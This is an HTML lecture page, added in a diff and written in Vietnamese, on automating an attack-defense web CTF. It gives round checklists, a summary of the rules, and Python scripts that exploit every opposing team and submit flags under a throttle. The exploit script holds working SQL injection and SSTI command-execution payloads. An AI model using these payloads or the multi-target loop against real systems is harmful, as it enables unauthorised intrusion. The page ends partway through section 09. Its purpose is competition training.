@@ -1,0 +1,524 @@
+<title>A/D Automation &amp; Round Checklist — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.twolayer{display:flex;flex-direction:column;gap:0;border-radius:14px;overflow:hidden;border:1px solid var(--line);margin:16px 0}
+.layer{padding:14px 16px}
+.layer.combat{background:var(--accent-soft);border-bottom:2px dashed var(--accent)}
+.layer.deep{background:var(--mem-soft)}
+.layer .lh{font-family:var(--font-head);font-weight:700;font-size:15px;display:flex;align-items:center;gap:7px;margin-bottom:3px}
+.layer.combat .lh{color:var(--accent)}.layer.deep .lh{color:var(--mem)}
+.layer p{margin:3px 0 0;font-size:14px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.badge{display:inline-block;font-family:var(--font-mono);font-size:11px;padding:2px 8px;border-radius:999px;font-weight:700}
+.badge.easy{background:var(--ok-soft);color:var(--ok)}
+.badge.med{background:var(--accent-soft);color:var(--accent)}
+.badge.hard{background:color-mix(in srgb,var(--danger) 16%,transparent);color:var(--danger)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · Attack-Defense — vận hành trận đấu thật</div>
+    <h1>A/D Automation &amp; Round Checklist</h1>
+    <p class="sub">Khác mọi bài trước (mỗi bài là 1 kỹ thuật khai thác), đây là bài <strong>vận hành</strong> —
+    cách biến mọi exploit đã học thành một dây chuyền chạy tự động suốt 10 round, 3 tiếng, với rất nhiều đội đối
+    thủ, mà không tự vi phạm luật (nộp quá 30 lần/phút, phá service đối thủ...).</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Kiến trúc</a><a href="#s04">04 Checklist round</a>
+      <a href="#s05">05 Chuẩn bị trước thi</a><a href="#s06">06 Quy tắc tuân thủ</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ 1 round</a><a href="#s10">10 WAF song song</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Vì sao cần tự động hóa, không chỉ "biết khai thác"?</h2>
+  <p class="lead">Trong F-Hacker, lỗ hổng <strong>giống hệt nhau</strong> ở mọi đội. Việc khó không phải là tìm ra
+  lỗ hổng lần đầu (làm 1 lần trên service của chính mình), mà là <strong>khai thác lại nó nhanh, ổn định, nhiều
+  lần</strong> — qua 10 round, qua hàng chục đội đối thủ, trong khi vẫn phải viết WAF rule phòng thủ và không
+  được vi phạm luật (giới hạn nộp flag, cấm phá service). Ai tự động hóa tốt hơn — không phải ai "giỏi hack" hơn
+  — thường thắng trong A/D.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Tách rời <strong>3 việc</strong> thành 3 thành phần độc lập: (1) script khai thác lấy flag, (2) file lưu flag
+  thu được, (3) script nộp flag có throttle riêng. Đừng gộp "vừa khai thác vừa nộp" vào 1 vòng lặp — nếu 1 đội
+  bị lỗi/timeout, nó không được làm chậm việc nộp flag đã lấy được từ các đội khác.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — checklist đầu mỗi round, đọc trong 1 phút</div>
+  <div class="combatcard">
+    <div class="ch">⚡ MỖI KHI ROUND MỚI BẮT ĐẦU</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Round vừa reset — làm NGAY</span>
+        Service đã reset về trạng thái gốc, flag mới, cờ cũ hết hạn. Chạy NGAY toàn bộ exploit đã có sẵn lên
+        TẤT CẢ các đội (script mục 08.C) — đừng chờ.
+      </div>
+      <div class="cslot"><span class="lab">✅ Thứ tự ưu tiên trong round</span>
+        (1) Chạy exploit cũ lấy flag mọi đội → (2) Nộp flag qua script throttle → (3) Kiểm tra DEF/SVC của mình,
+        xem log WAF có bị tấn công/chặn nhầm không → (4) Nếu có thời gian, đọc source tìm lỗ hổng MỚI (Level 2
+        mở từ round 4).
+      </div>
+      <div class="cslot"><span class="lab">🔍 Kiểm tra sức khỏe service của mình</span>
+        Mở Dashboard xem SVC có đang giảm không (dấu hiệu WAF chặn nhầm request của bot healthcheck, hoặc service
+        tự lỗi) — xử lý NGAY vì SVC mất không hồi phục trong round.
+      </div>
+      <div class="cslot"><span class="lab">💥 Lệnh chạy nhanh (điền sẵn trước thi)</span>
+<pre><code><span class="c"># Chạy mọi exploit đã có lên mọi đội, lưu flag ra file</span>
+python3 run_all_exploits.py teams.txt >> flags.txt
+
+<span class="c"># Nộp flag mới thu được, có throttle sẵn</span>
+python3 submit_flags.py flags.txt submitted.txt</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + quy tắc KHÔNG được quên</span>
+        KHÔNG tấn công trước 08h30/sau 11h30. KHÔNG phá service sau khi lấy flag (chỉ lấy, không xóa/sửa dữ liệu
+        đối thủ). KHÔNG nộp flag nhà mình (0 điểm ATK + bị trừ 2×BP). Nộp ≤30 lần/phút — script throttle PHẢI
+        kiểm tra giới hạn này tự động, không dựa vào tự canh giờ.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Cấu trúc trận đấu cần nhớ nằm lòng</h2>
+  <div class="def"><b>Round</b> — 1 chu kỳ thi, có BP (điểm/cờ) và thời lượng riêng (10 round trong 3 giờ, ngắn
+  dần, điểm tăng dần — xem Quy chế Điều 2). Đầu mỗi round: service reset về gốc, cờ mới, cờ cũ hết hạn ngay.</div>
+  <div class="def"><b>ATK / DEF / SVC</b> — 3 thành phần điểm: ATK (cướp cờ đối thủ), DEF (giữ cờ nhà, chỉ mất
+  không tự hồi trong round), SVC (giữ service sống cho bot healthcheck mỗi 30 giây).</div>
+  <div class="def"><b>Throttle</b> — giới hạn tốc độ gửi (ở đây là giới hạn nộp flag ≤30 lần/phút) — vượt quá bị
+  lỗi 429 VÀ bị coi là vi phạm luật (brute-force cổng nộp flag), có thể bị trừ điểm.</div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CẦN TỰ ĐỘNG HÓA</div>
+  <h2>Toán: tại sao tay không theo kịp</h2>
+  <p>Giả sử có 15 đội, mỗi round dài 15-30 phút (càng về sau càng ngắn). Khai thác tay 1 đội mất ~1-2 phút (mở
+  Burp, gửi payload, đọc response, copy flag). Với 14 đội đối thủ, làm tay hết
+  <strong>14-28 phút</strong> — gần hết cả round chỉ để khai thác 1 lỗ hổng, chưa kể phải lặp lại ở round sau (vì
+  flag hết hạn). Một script Python lặp qua 14 đội mất <strong>vài giây tới vài chục giây</strong> — đây là lý do
+  then chốt khiến tự động hóa quyết định thắng thua, không phải việc "biết thêm lỗ hổng mới".</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / KIẾN TRÚC ← MỤC LÕI</div>
+  <h2>3 thành phần tách rời, không gộp chung</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 220" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .box-ok{fill:var(--ok-soft);stroke:var(--ok);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr14)}
+    </style>
+    <defs><marker id="arr14" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+
+    <rect x="10" y="20" width="195" height="60" rx="10" class="box-a"/>
+    <text x="22" y="40" class="lbl-m">teams.txt (danh sách IP)</text>
+    <text x="22" y="56" class="lbl-a">14 đội đối thủ</text>
+
+    <path d="M205,50 H243" class="arrow"/>
+    <rect x="248" y="20" width="195" height="60" rx="10" class="box"/>
+    <text x="260" y="40" class="lbl-m">(1) run_all_exploits.py</text>
+    <text x="260" y="56" class="lbl">loop qua từng đội, lấy flag</text>
+
+    <path d="M443,50 H480" class="arrow"/>
+    <rect x="485" y="20" width="185" height="60" rx="10" class="box-ok"/>
+    <text x="497" y="40" class="lbl-m">(2) flags.txt</text>
+    <text x="497" y="56" class="lbl-ok">file trung gian -- tách rời</text>
+
+    <path d="M565,85 V110" class="arrow"/>
+    <rect x="248" y="115" width="195" height="60" rx="10" class="box-a"/>
+    <text x="260" y="135" class="lbl-m">(3) submit_flags.py</text>
+    <text x="260" y="151" class="lbl-a">đọc flags.txt, nộp có throttle</text>
+
+    <path d="M248,145 H90" class="arrow"/>
+    <rect x="10" y="115" width="200" height="60" rx="10" class="box"/>
+    <text x="22" y="135" class="lbl-m">submitted.txt</text>
+    <text x="22" y="151" class="lbl">khử trùng -- không nộp lại flag cũ</text>
+  </svg>
+  </div>
+  <p>Lý do tách 3 thành phần: (1) script khai thác có thể chạy <strong>nhiều lần/liên tục</strong> không giới
+  hạn (chỉ giới hạn bởi tốc độ mạng/server đối thủ), trong khi (2) việc nộp flag <strong>bắt buộc</strong>
+  throttle ≤30/phút — nếu gộp chung, script khai thác sẽ bị "nghẽn cổ chai" theo tốc độ nộp, lãng phí thời gian
+  lẽ ra dùng để lấy thêm flag từ các đội khác. Tách riêng giúp (1) chạy hết tốc lực, (3) chạy đều đặn độc lập.</p>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / CHECKLIST CHI TIẾT MỖI ROUND</div>
+  <h2>Làm theo đúng thứ tự, không bỏ bước</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Phát hiện round mới</div><div class="d">Theo dõi Dashboard/thời gian — round reset đồng loạt cho mọi đội tại cùng 1 thời điểm (xem lịch round ở Quy chế Điều 2).</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Chạy toàn bộ exploit đã có</div><div class="d"><code>run_all_exploits.py</code> (mục 08.C) — chạy MỌI lỗ hổng đã xác nhận trước đó lên mọi đội, không chỉ 1 lỗ hổng.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Nộp flag</div><div class="d">Chạy/để chạy nền <code>submit_flags.py</code> — đọc file flag thu được, nộp đều đặn theo throttle.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Kiểm tra sức khỏe nhà mình</div><div class="d">Xem Dashboard: SVC có giảm bất thường không (WAF chặn nhầm bot healthcheck?), DEF có bị trừ nhiều không (bị cướp cờ nhiều?).</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Nếu có Level 2 (từ round 4) hoặc lỗ hổng mới</div><div class="d">Đọc source phần mới, viết exploit + rule WAF mới, thêm vào danh sách <code>run_all_exploits.py</code> cho round sau.</div></div></div>
+    <div class="srow"><span class="n">6</span><div><div class="t">Cân nhắc Cửa hàng</div><div class="d">Nếu dư điểm ATK và có món hữu ích (vd đổi mật khẩu Dashboard nếu cần), cân nhắc dùng — chỉ tiêu điểm ATK, không ảnh hưởng cột ATK hiển thị.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / CHUẨN BỊ TRƯỚC NGÀY THI (KHÔNG PHẢI LÚC THI)</div>
+  <h2>Việc phải xong TRƯỚC khi vào phòng (không có Internet trong giờ thi)</h2>
+  <table>
+    <tr><th>Việc</th><th>Chi tiết</th></tr>
+    <tr><td>Tải sẵn toàn bộ công cụ offline</td><td>PayloadsAllTheThings, SecLists, sqlmap, commix, tplmap, jwt_tool, flask-unsign, php_filter_chain_generator, git-dumper, GitTools, CyberChef — xem từng bài kỹ thuật để biết vị trí (<code>~/hoc/CTF/Tools/web/</code>)</td></tr>
+    <tr><td>Cài extension Burp cần Internet</td><td>JWT Editor, Turbo Intruder, Autorize — BApp Store cần mạng, không cài được trong phòng thi</td></tr>
+    <tr><td>Luyện WAF trước</td><td>Repo <code>f-hacker-macos/2026-waf-practice</code> (xem bài WAF) — quen giao diện UI WAF thật sẽ dùng khi thi</td></tr>
+    <tr><td>Soạn sẵn khung script</td><td><code>run_all_exploits.py</code>, <code>submit_flags.py</code> dạng khung rỗng, chỉ cần điền payload cụ thể lúc thi (xem mục 08)</td></tr>
+    <tr><td>In/lưu offline toàn bộ 27 bài giảng này</td><td>Mang giấy hoặc file mở được không cần mạng (các file <code>.html</code> này tự chứa toàn bộ, mở bằng trình duyệt bất kỳ, không cần server)</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / QUY TẮC TUÂN THỦ — KHÔNG ĐƯỢC VI PHẠM</div>
+  <h2>Vi phạm = trừ điểm nặng hoặc loại (Điều 6 Quy chế)</h2>
+  <table>
+    <tr><th>Hành vi CẤM</th><th>Hậu quả</th></tr>
+    <tr><td>DoS/DDoS, làm sập WAF/app đội khác</td><td>Trừ 100đ lần 1, 300đ lần 2, loại lần 3</td></tr>
+    <tr><td>Chia sẻ exploit/rule với đội khác</td><td>Như trên</td></tr>
+    <tr><td>Tấn công hạ tầng BTC (Dashboard, bot, proxy, DNS)</td><td>Như trên</td></tr>
+    <tr><td>Đăng nhập/tấn công UI WAF đội khác</td><td>Như trên</td></tr>
+    <tr><td>Tấn công trước 08h30/sau 11h30 (dự kiến)</td><td>Như trên + hủy điểm ATK liên quan</td></tr>
+    <tr><td>Phá hoại service đối thủ sau khi khai thác (chỉ được lấy flag)</td><td>Như trên + hủy điểm ATK liên quan</td></tr>
+    <tr><td>Chặn riêng bot healthcheck, làm sai lệch kết quả chấm</td><td>Như trên + hủy điểm ATK liên quan</td></tr>
+    <tr><td>Brute-force cổng nộp flag, vượt 30 lần/phút</td><td>Như trên + hủy điểm ATK liên quan</td></tr>
+    <tr><td>Tấn công laptop đội khác, dùng Internet/AI dưới mọi hình thức, chia sẻ flag, xóa lịch sử trình duyệt</td><td><strong>Hủy kết quả, mời ra khỏi phòng thi</strong></td></tr>
+  </table>
+  <div class="note warn"><span class="tag">Script của bạn PHẢI tự kiểm soát</span>Đừng dựa vào "tôi sẽ cẩn thận
+  canh tay" — code hóa trực tiếp các giới hạn này vào script (throttle cứng, không target chính mình, dừng ngoài
+  khung giờ thi) để không bao giờ lỡ vi phạm vì vội/mệt giữa trận.</div>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: CHUẨN BỊ FILE TEAMS.TXT</div>
+  <h2>Quản lý danh sách đội — nền tảng của mọi script</h2>
+  <pre><code><span class="c"># teams.txt -- 1 dòng 1 IP, lấy từ BTC công bố trước giờ thi, cập nhật nếu BTC đổi</span>
+10.10.1.1
+10.10.2.1
+10.10.3.1
+<span class="c"># ... (loại bỏ IP của chính đội mình để không tự quét/tự nộp nhầm)</span></code></pre>
+  <div class="note tip"><span class="tag">Chuẩn bị sẵn khung đọc file này</span>Mọi script mục 08 đều đọc
+  <code>teams.txt</code> theo cùng 1 format — chuẩn bị sẵn trước thi, chỉ cần điền đúng IP lúc BTC công bố.</div>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHUNG (3 PHẦN TÁCH RỜI)</div>
+  <h2>Khung chạy thật trong trận — điền payload cụ thể từng bài vào đây</h2>
+
+  <h3>(A) run_all_exploits.py — chạy mọi exploit đã có, lấy flag</h3>
+  <pre><code><span class="k">import</span> re, requests
+<span class="k">from</span> concurrent.futures <span class="k">import</span> ThreadPoolExecutor, as_completed
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+
+<span class="c"># === Danh sách exploit đã xác nhận -- thêm dần qua các round ===</span>
+<span class="k">def</span> <span class="d">exploit_sqli</span>(host):
+    r = requests.get(<span class="s">f"http://{host}/item"</span>,
+            params={<span class="s">"id"</span>: <span class="s">"0 UNION SELECT 1,flag,3 FROM flags-- -"</span>}, timeout=5)
+    m = FLAG_RE.search(r.text)
+    <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+
+<span class="k">def</span> <span class="d">exploit_ssti</span>(host):
+    r = requests.post(<span class="s">f"http://{host}/greet"</span>,
+            data={<span class="s">"name"</span>: <span class="s">"{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"</span>}, timeout=5)
+    m = FLAG_RE.search(r.text)
+    <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+
+EXPLOITS = [exploit_sqli, exploit_ssti]   <span class="c"># thêm hàm mới mỗi khi tìm ra lỗ hổng thêm</span>
+
+<span class="k">def</span> <span class="d">run_on_team</span>(host):
+    <span class="k">for</span> exploit <span class="k">in</span> EXPLOITS:
+        <span class="k">try</span>:
+            flag = exploit(host)
+            <span class="k">if</span> flag:
+                <span class="k">return</span> host, flag
+        <span class="k">except</span> requests.RequestException:
+            <span class="k">continue</span>
+    <span class="k">return</span> host, <span class="k">None</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    teams = open(<span class="s">"teams.txt"</span>).read().split()
+    <span class="k">with</span> ThreadPoolExecutor(max_workers=10) <span class="k">as</span> ex:
+        futures = [ex.submit(run_on_team, host) <span class="k">for</span> host <span class="k">in</span> teams]
+        <span class="k">with</span> open(<span class="s">"flags.txt"</span>, <span class="s">"a"</span>) <span class="k">as</span> f:
+            <span class="k">for</span> future <span class="k">in</span> as_completed(futures):
+                host, flag = future.result()
+                <span class="k">if</span> flag:
+                    <span class="k">print</span>(<span class="s">f"[+] {host}: {flag}"</span>)
+                    f.write(<span class="s">f"{flag}\n"</span>)</code></pre>
+
+  <h3>(B) submit_flags.py — nộp flag với throttle ≤30/phút, khử trùng</h3>
+  <pre><code><span class="k">import</span> time, requests
+
+DASHBOARD_SUBMIT_URL = <span class="s">"https://dashboard.fhacker2026.local/submit"</span>
+MAX_PER_MINUTE = 25   <span class="c"># để dư 5 so với giới hạn 30 -- tránh sát ngưỡng gây 429</span>
+
+<span class="k">def</span> <span class="d">load_submitted</span>(path=<span class="s">"submitted.txt"</span>):
+    <span class="k">try</span>:
+        <span class="k">return</span> <span class="k">set</span>(open(path).read().split())
+    <span class="k">except</span> FileNotFoundError:
+        <span class="k">return</span> <span class="k">set</span>()
+
+<span class="k">def</span> <span class="d">submit_loop</span>(flags_path=<span class="s">"flags.txt"</span>):
+    submitted = load_submitted()
+    delay = 60 / MAX_PER_MINUTE
+    <span class="k">while</span> <span class="k">True</span>:
+        flags = <span class="k">set</span>(open(flags_path).read().split()) - submitted
+        <span class="k">for</span> flag <span class="k">in</span> flags:
+            r = requests.post(DASHBOARD_SUBMIT_URL, json={<span class="s">"flag"</span>: flag}, timeout=5)
+            <span class="k">print</span>(flag, <span class="s">"-&gt;"</span>, r.status_code, r.text[:80])
+            submitted.add(flag)
+            <span class="k">with</span> open(<span class="s">"submitted.txt"</span>, <span class="s">"a"</span>) <span class="k">as</span> f:
+                f.write(flag + <span class="s">"\n"</span>)
+            time.sleep(delay)   <span class="c"># throttle CỨNG, không phụ thuộc tự canh tay</span>
+        time.sleep(5)   <span class="c"># chờ ngắn rồi đọc lại file flags.txt xem có flag mới không</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    submit_loop()</code></pre>
+
+  <h3>(C) Chạy cả 2 song song trong 1 round</h3>
+  <pre><code><span class="c"># Terminal 1: chạy nền, nộp flag liên tục suốt round</span>
+python3 submit_flags.py &amp;
+
+<span class="c"># Terminal 2: chạy mỗi khi round mới bắt đầu (lặp lại thủ công, không để chạy liên tục</span>
+<span class="c"># vì sẽ tốn tài nguyên/gây nghi ngờ DoS nếu chạy dồn dập không cần thiết)</span>
+python3 run_all_exploits.py</code></pre>
+  <div class="note tip"><span class="tag">Vì sao KHÔNG để run_all_exploits.py chạy vòng lặp vô hạn</span>
+  Chạy lại thủ công mỗi khi round mới reset (hoặc đặt hẹn giờ theo đúng lịch round đã biết trước ở Quy chế Điều 2)
+  — chạy liên tục vô ích vì flag chỉ đổi khi round đổi, và chạy dồn dập liên tục có thể bị hiểu nhầm là hành vi
+  bất thường (dù không cấu thành DoS thật).</div>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ 1 ROUND ĐẦY ĐỦ</div>
+  <h2>Từ lúc round reset tới khi nộp xong flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">08h30 — Round 1 bắt đầu</div><div class="d">Service reset, flag mới. Terminal nền <code>submit_flags.py</code> đã chạy sẵn từ trước giờ thi.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Chạy exploit</div><div class="d"><code>python3 run_all_exploits.py</code> — chạy qua 14 đội, in ra 9 đội lấy được flag (5 đội còn lại có thể đã tự vá hoặc tạm thời service lỗi), ghi vào <code>flags.txt</code>.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Tự động nộp</div><div class="d"><code>submit_flags.py</code> đang chạy nền tự phát hiện 9 flag mới trong <code>flags.txt</code>, nộp lần lượt cách nhau 2.4 giây (60/25) — xong trong ~22 giây, không chạm ngưỡng 30/phút.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Kiểm tra sức khỏe</div><div class="d">Dashboard: DEF còn 80% (bị 2-3 đội cướp cờ), SVC còn 100% (chưa ai tấn công/WAF chưa chặn nhầm gì) — ổn.</div></div></div>
